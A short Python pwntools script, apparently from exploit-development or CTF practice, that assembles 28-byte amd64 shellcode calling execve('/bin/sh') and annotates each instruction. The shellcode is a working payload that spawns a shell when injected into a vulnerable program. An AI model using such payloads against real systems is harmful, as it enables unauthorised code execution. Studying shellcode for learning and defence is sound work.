from pwn import *

# Shellcode for execve("/bin/sh",0,0)
context.arch = "amd64"
shellcode = """
xor rax, rax
push rax
push rax
pop rsi
pop rdx
mov rcx, 0x68732f6e69622f41             
shr rcx, 0x8                            
push rcx
push rsp
pop rdi
mov al, 0x3b                            
syscall
"""
# line 6 to 10: To make rax,rsi and rdx null.
# line 11: moving "A/bin/sh" into rcx.
# line 12: shifting rcx towards right to make "A/bin/sh" to "/bin/sh\x00".
# line 13 to 15: Moving the pointer which points to "/bin/sh\x00" into rdi.
# line 16 : Moving the syscall number of execve() into rax. 
shellcode = asm(shellcode)
log.info(f"bytes of the shellcode: {shellcode}")            
log.info(f"lenght of the shellcode: {len(shellcode)}")        # 28 bytes shellcode
